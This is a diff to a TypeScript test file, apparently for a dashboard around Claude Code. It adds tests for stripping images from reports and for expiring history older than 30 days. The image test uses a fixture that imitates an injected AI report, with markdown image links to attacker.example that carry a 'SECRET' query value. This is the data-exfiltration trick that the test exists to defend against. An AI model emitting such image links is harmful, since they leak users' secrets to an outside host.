@@ -1,6 +1,6 @@
 import { expect, test } from 'claude-code/testing'
 
-import { bandSvg, costOf, ctxCells, ctxColor, ctxGaugeSvg, fmtAt, fmtCost, fmtIn, fmtElapsed, fmtPercent, fmtStart, fmtTokens, grouped, mascotSvg, mergeLive, modelLabel, limitRows, limitsHeading, newerReading, ordered, outfitFor, restore, windowOf, withStep } from './register'
+import { bandSvg, costOf, ctxCells, ctxColor, ctxGaugeSvg, fmtAt, fmtCost, fmtIn, fmtElapsed, fmtPercent, fmtStart, fmtTokens, grouped, isStale, mascotSvg, mergeLive, modelLabel, limitRows, limitsHeading, newerReading, ordered, outfitFor, restore, windowOf, withoutImages, withStep } from './register'
 
 const PANE = {
   component: 'Pane',
@@ -291,4 +291,20 @@ test('the context gauge: gray, amber from 70%, red from 90%, five cells in a ter
   expect(ctxGaugeSvg(0.1, 'tiny')).toContain('width="2"')
   expect(ctxGaugeSvg(50, 'half')).toContain('width="18" height="5" rx="2" fill="#8E8E8E"')
   expect(ctxGaugeSvg(95, 'full <x>')).toContain('fill="#D0453A"')
+})
+
+test('a report draws no image: each one turns into a plain link, the text otherwise untouched', async () => {
+  const injected = 'Done. ![status](https://attacker.example/p.png?d=SECRET) and ![ref][1]\n\n[1]: https://attacker.example/q.png'
+  const safe = withoutImages(injected)
+  expect(safe).not.toContain('![')
+  expect(safe.replace(/\u200b/g, '')).toBe(injected)
+  expect(withoutImages('No image, a [link](https://example.com) and a `code` span!')).toBe('No image, a [link](https://example.com) and a `code` span!')
+})
+
+test('a history older than 30 days is stale, like Claude Code\'s own transcripts', async () => {
+  const DAY = 86_400_000
+  expect(isStale({ savedAt: NOW - 29 * DAY, agents: [] }, NOW)).toBe(false)
+  expect(isStale({ savedAt: NOW - 31 * DAY, agents: [] }, NOW)).toBe(true)
+  // Whatever else sits under a history key goes too.
+  for (const junk of [undefined, null, 'x', {}, { savedAt: 'yesterday' }]) expect(isStale(junk, NOW)).toBe(true)
 })
